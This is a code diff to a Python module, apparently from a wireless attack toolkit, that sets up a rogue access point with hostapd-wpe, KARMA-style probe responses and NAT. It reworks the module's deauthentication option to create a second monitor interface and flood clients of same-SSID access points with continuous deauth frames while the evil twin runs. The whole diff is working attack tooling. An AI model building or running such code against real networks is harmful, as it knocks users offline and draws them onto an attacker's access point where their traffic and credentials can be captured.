@@ -36,11 +36,13 @@ class Module(BaseScript):
     META["options"].add_argument("-k", "--karma",
                                  help="respond to all directed probe requests (KARMA-style gratuitous probe responses)",
                                  action="store_true")
-    META["options"].add_argument("-d", "--deauth", help="perform a deauthentication attack to all clients connected to "
-                                                        "any access point that announce the same SSID (argument "
-                                                        "--ssid) before the AP is started. Requires these access "
-                                                        "points to previously be in the reconnaissance database (use "
-                                                        "the module discovery/recon).", action="store_true")
+    META["options"].add_argument("-d", "--deauth", help="perform a continuous deauth attack to all clients connected "
+                                                        "to any access point that announce the same SSID (argument "
+                                                        "--ssid) on the same channel (argument --channel) after the "
+                                                        "rogue AP is started. Requires these APs to previously be in "
+                                                        "the recon db (use the module discovery/recon), and your WiFi "
+                                                        "card to support multiple interfaces. The deauth attack can be "
+                                                        "stopped using ctrl-c.", action="store_true")
     META["options"].add_argument("--mac-acl",
                                  help="path to a MAC addresses whitelist. If specified, all the clients whose MAC "
                                       "address is not in this list will be rejected.",
@@ -64,22 +66,6 @@ class Module(BaseScript):
     def run(self, args, cmd):
         script_args = argparse.Namespace()
 
-        script_args.deauth_args_lst = []
-
-        if args.deauth:
-            with db_session:
-                try:
-                    for bss in ExtendedServiceSet[args.ssid].bssets:
-                        script_args.deauth_args_lst.append(to_args_str({
-                            "iface": args.iface,
-                            "bssid": bss.bssid,
-                            "channel": bss.channel
-                            # "client": "FF:FF:FF:FF:FF:FF"
-                            # "num-packets": 10
-                        }))
-                except:
-                    pass
-
         script_args.hostapd_wpe_args = to_args_str({
             "iface": args.iface,
             "channel": args.channel,
@@ -97,7 +83,25 @@ class Module(BaseScript):
             "lease-time": args.dhcp_lease_time,
         })
 
-        super().run(script_args, cmd)
+        script_args.deauth_args_lst = []
+        additional_mon_iface = None
+
+        if args.deauth:
+            additional_mon_iface_name = "{}mon".format(args.iface)
+            additional_mon_iface = pyw.devadd(pyw.getcard(args.iface), additional_mon_iface_name, "monitor")
+
+            with db_session:
+                try:
+                    for bss in ExtendedServiceSet[args.ssid].bssets.select(lambda bss: bss.channel == args.channel):
+                        script_args.deauth_args_lst.append(to_args_str({
+                            "iface": additional_mon_iface_name,
+                            "bssid": bss.bssid,
+                            "channel": args.channel,
+                            "num-frames": 0,
+                            # "client": "FF:FF:FF:FF:FF:FF"
+                        }))
+                except:
+                    pass
 
         pyw.ifaddrset(pyw.getcard(args.iface), args.router_ip, args.netmask)
 
@@ -109,6 +113,11 @@ class Module(BaseScript):
         nat_rule.out_interface = args.out_iface
         nat_rule.target = nat_rule.create_target("MASQUERADE")
         iptc.Chain(iptc.Table(iptc.Table.NAT), "POSTROUTING").append_rule(nat_rule)
+
+        super().run(script_args, cmd)
+
+        if additional_mon_iface:
+            pyw.devdel(additional_mon_iface)
 
     def stop(self, cmd):
         super().stop(cmd)
